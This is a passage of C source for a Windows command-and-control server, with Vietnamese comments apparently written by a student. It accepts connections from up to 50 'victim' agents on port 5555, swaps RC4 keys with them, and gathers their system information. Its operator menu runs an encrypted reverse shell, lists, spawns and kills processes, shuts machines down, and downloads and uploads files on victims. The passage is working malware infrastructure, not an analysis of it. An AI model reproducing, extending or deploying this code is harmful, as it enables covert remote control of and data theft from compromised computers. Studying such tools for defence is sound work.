        WriteFile(hFile, recvBuf, dwCurBytesRecv, &dwNumOfBytesWritten, NULL);

        // Cộng số bytes nhận được vào tổng số bytes đã nhận.
        dwBytesRecv += dwCurBytesRecv;

        // Nếu số bytes đã nhận lớn hơn hoặc bằng số kích thước của file cần download,
        // sẽ thực hiện thoát vòng lặp.
        if (dwBytesRecv >= dwAllBytesRecv)break;
    }

    // Giải phóng critical section.
    LeaveCriticalSection(&criticalSection);

    // Close handle giữ file, in ra kết quả thành công và trả về TRUE.
    CloseHandle(hFile);
    SUCCESS("[+] Download file success\n")
    return TRUE;
}

// Tạo key cho mỗi kết nối đến c2.
VOID GenerateRandomKey(CHAR* key, DWORD dwKeyLen) {

    // Key được tạo từ các ký tự trong bảng alphabet và các số từ 0 đến 9.
    CHAR charSet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    // Random từng ký từ trong charSet và nối các ký tự lại với nhau 
    // cho đến kích thước của key được truyền vào, ở đây em sử dụng kích thước key là 16 bytes.
    DWORD dwCharSetSz = sizeof(charSet) - 1;
    for (DWORD i = 0; i < dwKeyLen; ++i) {
        key[i] = charSet[rand() % dwCharSetSz];
    }

    // Có một byte padding sau cùng là byte NULL (byte thứ 17).
    key[dwKeyLen] = '\0';  
}

// Nhận thông tin từ victim và gửi key dùng để mã hóa giao tiếp cho victim.
BOOL RecvSysInfoAndSendKey(SOCKET ioSock) {

    BYTE recvBuf[MAX_CHUNK], sendBuf[MAX_CHUNK];
    BYTE key[MAX_KEY + 1];
    
    // Khi có một kết nối đến c2, máy chủ đó sẽ gửi thông tin cơ bản đến cho c2.
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] Failed to receive victim's system information. Error code = %d\n", GetLastError())
        return FALSE;
    }

    // Nếu byte đầu tiên không phải là lệnh yêu cầu gửi RC4 key, trả về FALSE
    if (recvBuf[0] != QUERY_RC4_KEY_COMMAND)return FALSE;

    // Tạo một key với kích thước 16 bytes cho mỗi kết nối đến c2.
    GenerateRandomKey(key, MAX_KEY);

    // In ra thông tin của key bên phía c2.
    printf(YELLOW);
    printf("[+] Rc4 key: %s\n", key);
    printf(RESET);

    // Gửi key đến cho victim, ở đây sử dụng MAX_KEY + 1 là vì có 1 byte NULL được padding ở byte cuối.
    RtlCopyMemory(sendBuf, key, MAX_KEY + 1);
    if (send(ioSock, sendBuf, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] Failed to send rc4 key to victim. Error code = %d\n", GetLastError())
        return FALSE;
    }

    // Nếu hàm send không trả về số bytes bé hơn 0 thì in ra kết quả thành công.
    printf(YELLOW);
    WARNING("[+] Send rc4 key to victim success\n")
    printf(RESET);

    // Nhận thông tin hệ thống của victim được gửi về cho c2.
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] Failed to receive system information from victim. Error code = %d\n", GetLastError())
        return FALSE;
    }

    // Giải mã thông tin vừa nhận được.
    // CopyMemory(rc4Key, key, MAX_KEY + 1);
    RC4Init(key);
    RC4Crypt(recvBuf, MAX_CHUNK - 1);
    
    // Tiếp tục gọi hàm AgentConnected() để xử lý thông tin vừa nhận được.
    AgentConnected(ioSock, recvBuf, key);

    // Sau cùng trả về TRUE.
    return TRUE;
}


//===================================================================================================================================================


VOID ShowListAgents() {

    WARNING("\n Number       IPv4           Key                     DeviceName                  UserName\n")
    WARNING("---------    -------        ------                  -------------               -----------\n")
    for (int i = 0; i < 50; i++) {
        if (agents[i].Socket == 0)
            break;
        printf(" %d         %s       %s", i, inet_ntoa(agents[i].SocketAddr.sin_addr), agents[i].Key);
        wprintf(L"        %ls              %ls\n", agents[i].DeviceName,
            agents[i].UserName);
    }
    printf(RESET);
}


// clear console
VOID ClearConsoleScreen() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    COORD coordScreen = { 0, 0 };
    DWORD cCharsWritten;
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD dwConSize;

    GetConsoleScreenBufferInfo(hConsole, &csbi);
    dwConSize = csbi.dwSize.X * csbi.dwSize.Y;

    FillConsoleOutputCharacter(hConsole, ' ', dwConSize, coordScreen, &cCharsWritten);
    GetConsoleScreenBufferInfo(hConsole, &csbi);
    FillConsoleOutputAttribute(hConsole, csbi.wAttributes, dwConSize, coordScreen, &cCharsWritten);
    SetConsoleCursorPosition(hConsole, coordScreen);
}

VOID MainMenu() {

    WARNING("\n Command                    Description                     Argumments\n")
    WARNING("---------                  -------------                   ------------\n")
    WARNING(" help                       Show help.\n")
    WARNING(" quit                       Exit.\n")
    WARNING(" list                       List active agents.\n")
    WARNING(" connect                    Conneting to agent.             <IPv4>\n\n")

}

VOID HostMenu() {
    WARNING("\n Command                    Description                          Argumments\n")
        WARNING("---------                  -------------                        ------------\n")
        WARNING(" help                       Show help.\n")
        WARNING(" quit                       Exit.\n")
        WARNING(" shell                      Reverse shell.\n")
        WARNING(" infor                      Show host's information.\n")
        WARNING(" psenum                     List process running.\n")
        WARNING(" psspawn                    Create process on agent.           <ProcessName>\n")
        WARNING(" psster                     Terminate process on agent.        <IdProcess>\n")
        WARNING(" shutdown                   Shutdown or Reboot agent.          <mode>: 0 for reboot, 1 for shutdown\n")
        WARNING(" download                   Download file from agent.          <inputPath> <outputPath>\n")
        WARNING(" upload                     Upload file to agent.              <inputPath> <outputPath>\n\n")
}

VOID HandleHostMenu(CHAR* ip) {
    SOCKET ioSock;
    DWORD check;

    checkMenu = HOST_MENU_STATUS;
    check = CheckSocket(ip);
    if (check == -1) {
        ERROR("[-] Fail connecting to agent: ")
        ERROR(ip)
        printf("\n");
        return;
    }
    SUCCESS("[+] Success connecting to agent.\n")
    ioSock = agents[check].Socket;
    CopyMemory(rc4Key, agents[check].Key, MAX_KEY + 1);
    CopyMemory(curDevice, agents[check].DeviceName, MAX_CHUNK);

    CHAR** put = (CHAR**)malloc(10 * sizeof(CHAR*));
    for (int i = 0; i < 10; i++) {
        put[i] = (CHAR*)malloc(MAX_CHUNK * sizeof(CHAR));
    }

    WCHAR temp1[MAX_CHUNK];
    WCHAR temp2[MAX_CHUNK];

    
    while (TRUE) {
        printf("\n");
        HOST_MENU(curDevice)
            ZeroMemory(choice2, MAX_CHUNK);
        fgets(choice2, MAX_CHUNK, stdin);
        for (int i = 0; i < 10; i++) {
            ZeroMemory(put[i], MAX_CHUNK);
        }
        GetInput(choice2, put);
        if (!strcmp(put[0], "help")) {
            SUCCESS("[*] Availale commands: \n")
            HostMenu();
        }
        else if (!strcmp(put[0], "quit")) {
            SUCCESS("[*] Exiting...\n")
                break;
        }
        else if (!strcmp(put[0], "shell")) {
            SUCCESS("[*] Remote shell...\n")
            EncryptedReverShell(ioSock);
        }
        else if (!strcmp(put[0], "infor")) {
            SUCCESS("[*] Get Information...: \n")
                GetInformationAgent(ip);
        }
        else if (!strcmp(put[0], "psenum")) {
            SUCCESS("[*] Get list process...: \n")
            ProcessEnumeration(ioSock);
        }
        else if (!strcmp(put[0], "psspaw")) {
            SUCCESS("[*] Create process...\n")
            ZeroMemory(temp1, MAX_CHUNK);
            mbstowcs(temp1, put[1], MAX_CHUNK);
            ProcessSpawn(ioSock, temp1);
        }
        else if (!strcmp(put[0], "pster")) {
            SUCCESS("[*] Terminate process...\n")
            ProcessTermination(ioSock, (DWORD)atoi(put[1]));
        }
        else if (!strcmp(put[0], "shutdown")) {
            if (atoi(put[1]) == 0 || atoi(put[1]) == 1) {
                if(atoi(put[1]) == 0)
                    SUCCESS("[*] Reboot agent...\n")
                else
                    SUCCESS("[*] Shutdown agent...\n")
                ShutDownOrRebootVictim(ioSock, (DWORD)atoi(put[1]));
            }
            else {
                ERROR("[-] Invalid mode.\n")
            }
        }
        else if (!strcmp(put[0], "download")) {
            SUCCESS("[*] Download file...\n")
            ZeroMemory(temp1, MAX_CHUNK);
            mbstowcs(temp1, put[1], MAX_CHUNK);
            ZeroMemory(temp2, MAX_CHUNK);
            mbstowcs(temp2, put[2], MAX_CHUNK);
            DownloadFile(ioSock, temp1, temp2);
        }
        else if (!strcmp(put[0], "upload")) {
            SUCCESS("[*] Upload file...\n")
            ZeroMemory(temp1, MAX_CHUNK);
            mbstowcs(temp1, put[1], MAX_CHUNK);
            ZeroMemory(temp2, MAX_CHUNK);
            mbstowcs(temp2, put[2], MAX_CHUNK);
            UploadFile(ioSock, temp1, temp2);
        }
        else if (!strcmp(put[0], "clear")) {
            ClearConsoleScreen();
        }   
        else {
            ERROR("[*] No command!!!\n")
                continue;
        }
    }

    for (int i = 0; i < 10; i++) {
        free(put[i]);
    }
    free(put);
}

VOID HandleMainMenu() {

    CHAR** put = (CHAR**)malloc(10 * sizeof(CHAR*));
    for (int i = 0; i < 10; i++) {
        put[i] = (CHAR*)malloc(MAX_CHUNK * sizeof(CHAR));
    }

    do {
        checkMenu = MAIN_MENU_STATUS;   
        printf("\n");
        C2_MENU
            ZeroMemory(choice1, MAX_CHUNK);
        fgets(choice1, MAX_CHUNK, stdin);
        for (int i = 0; i < 10; i++) {
            ZeroMemory(put[i], 32);
        }
        GetInput(choice1, put);
        if (!strcmp(put[0], "help")) {
            SUCCESS("[*] Availale commands: \n")
                MainMenu();
        }
        else if (!strcmp(put[0], "connect")) {
            SUCCESS("[*] Connecting to host: \n")
                HandleHostMenu(put[1]);
        }
        else if (!strcmp(put[0], "list")) {
            SUCCESS("[*] Available host: \n")
                ShowListAgents();
        }
        else if (!strcmp(put[0], "clear")) {
            ClearConsoleScreen();
        }
        else if (!strcmp(put[0], "quit")) {
            break;
        }
        else {
            ERROR("[*] No command!!!\n")
                continue;
        }
    } while (strcmp(put[0], "quit"));

    for (int i = 0; i < 10; i++) {
        free(put[i]);
    }
    free(put);
}

//====================================================================================================================================================

// Lắng nghe kết nối tại port 5555.
DWORD WINAPI Listener(LPVOID lpParam) {
    SOCKET ioSock;
    WSADATA wsaData;
    int conAddrLen = 0;
    DWORD blockingMode = 1;
    SOCKADDR_IN srvAddr, conAddr;
    DWORD dwNumOfBytesRead = 0, dwNumOfBytesWritten = 0;

    TAGINFORMATION("*************************************NETWORK INFORMATION****************************\n")

    // Khởi tạo winsock.
    srand((DWORD)time(NULL));
    if (WSAStartup(MAKEWORD(2, 2), &wsaData))
        BREAK_WITH_SOCKET_ERROR("[-] Failed to startup socket environment")
    
    // Khởi tại stream socket.
    srvSock = socket(AF_INET, SOCK_STREAM, 0);
    if (srvSock == INVALID_SOCKET) {
        BREAK_WITH_SOCKET_ERROR("[-] Failed to create server socket")
            goto EXIT;
    }

    // Định nghĩa thông tin cho socket vừa tạo.
    ZeroMemory(&srvAddr, sizeof(srvAddr));
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(5555);
    srvAddr.sin_addr.s_addr = INADDR_ANY;

    // Binding socket đến port 5555.
    if (bind(srvSock, (struct sockaddr*)&srvAddr, sizeof(srvAddr)) == SOCKET_ERROR)
        BREAK_WITH_SOCKET_ERROR("Failed to bind server socket")
    // Lắng nghe socket với tối đa 50 máy chủ.
    if (listen(srvSock, 50) == SOCKET_ERROR)
        BREAK_WITH_SOCKET_ERROR("Failed to listen new connection")
    WARNING("[+] Listening connection on port 5555...\n")

    // Khởi tạo một vòng lặp để chấp nhận các kết nối đến port đã lắng nghe.
    while (TRUE) {
        ioSock = INVALID_SOCKET;
        ZeroMemory(&conAddr, sizeof(conAddr));
        conAddrLen = sizeof(conAddr);

        // Chấp nhận kết nối từ socket mới.
        ioSock = accept(srvSock, (struct sockaddr*)&conAddr, &conAddrLen);
        if (ioSock == INVALID_SOCKET) {
            ERROR("Failed to accept a new connection")
                continue;
        }

        // In ra kết quả của kết nối mới nếu accept thành công.
        printf(YELLOW);
        printf("\n[+] Accept a connection from ip %s with port %hu\n",
            inet_ntoa(conAddr.sin_addr), ntohs(conAddr.sin_port));
        printf(RESET);
        
        // Tiếp theo gọi hàm RecvSysInfoAndSendKey để gửi key giao tiếp và một số thông tin cơ bản.
        RecvSysInfoAndSendKey(ioSock);
    }

    return 0;

// Đóng socket và giải phóng winsock.
EXIT:
    shutdown(srvSock, SD_BOTH);
    closesocket(srvSock);
    printf("[+] Close connection\n");
    WSACleanup();
}

// Xử lý các agent đã hủy kết nối đến c2.
BOOL AgentDisconnected(SOCKET Sock) {
    DWORD index;

    // Trước tiên thì đóng socket kết nối với agent đó.
    closesocket(Sock);

    // Tiếp theo tìm ra index của socket có trong danh sách các agent.
    for (int i = 0; i < 50 && agents[i].Socket != 0; i++)
        if (agents[i].Socket == Sock)
            index = i;

    // In ra thông tin của agent đã hủy kết nối.
    printf(BLUE); printf("\n\n[*] Agent disconneted %s: %d\n\n", 
        inet_ntoa(agents[index].SocketAddr.sin_addr), agents[index].Socket); printf(RESET);

    // Xử lý một chút về các menu.
    if (checkMenu == HOST_MENU_STATUS)
        HOST_MENU(curDevice)
    else if (checkMenu == MAIN_MENU_STATUS)
        C2_MENU
    
    // Chiếm quyền của critical section csListAgent để tránh xung đột với AgentConnected.
    EnterCriticalSection(&csListAgent);

    // Xóa agent hủy kết nối khỏi danh sách các agents.
    for (int i = index; i < 50 && agents[i].Socket != 0; i++)
        agents[i] = agents[i + 1];

    // Sau khi thao tác xong thì giải phóng đối tượng critical section.
    LeaveCriticalSection(&csListAgent);

    return TRUE;
}

// Kiểm tra trạng thái kết nối của các agent.
DWORD CheckActiveAgent(LPVOID lpPrams) {
    BYTE sendbuf[MAX_CHUNK];
    BYTE recvbuf[MAX_CHUNK];
    
    // Gán byte đầu tiên bằng lệnh kiểm tra trạng thái của agent.
    sendbuf[0] = CHECK_ACTIVE_COMMAND;

    // Sử dụng một vòng lặp để cứ 1 giây sẽ gửi lại lệnh kiểm tra trạng thái một lần.
    while (TRUE)
    {
        // Chiếm quyền critical section để tránh xung đột với quá trình truyền tải các dữ liệu lớn và liên tục như 
        // download, upload, shell, ...
        EnterCriticalSection(&criticalSection);

        // Tạo một vòng lặp để gửi kiểm tra đến tất cả các agent đã kết nối đến c2.
        for (int i = 0; i < 50 && agents[i].Socket != 0; i++) {

            // Nếu hàm send gửi trả về một SOCKET_ERROR thì gọi AgentConneted để xử lý agent đó.
            if (send(agents[i].Socket, sendbuf, MAX_CHUNK, 0) < 0) {
                AgentDisconnected(agents[i].Socket);
            }
        }

        // Giải phóng critical section và sleep 1 giây.
        LeaveCriticalSection(&criticalSection);
        Sleep(1000);
    }

    return 0;
}

int wmain(int argc, WCHAR** argv) {

    // Khởi tạo một số thông tin cơ bản.
    Init();

    // Tạo 2 luồng để lắng nghe và kiểm tra các kết nối.
    HANDLE hThreadListener = NULL;
    HANDLE hThreadCheckActive = NULL;
    hThreadListener = CreateThread(NULL, 0, Listener, (LPVOID) &agents[0], 0, NULL);
    if (hThreadListener == NULL) {
        ERROR("[+] Fail create listener thread.\n")
    }
    hThreadCheckActive = CreateThread(NULL, 0, CheckActiveAgent, NULL, 0, NULL);
    if (hThreadCheckActive == NULL) {
        ERROR("[+] Fail create listener thread.\n")
    }

    // Luồng chính thực hiện tương tác với menu.
    Sleep(100);
    HandleMainMenu();

    // Chờ khi luồng lắng nghe kết thúc thì thực hiện giải phóng các đối tượng và đóng handle.
    WaitForSingleObject(hThreadListener, INFINITE);
    DeleteCriticalSection(&criticalSection);
    DeleteCriticalSection(&csListAgent);
    CloseHandle(hThreadListener);
    CloseHandle(hThreadCheckActive);

    return 0;
}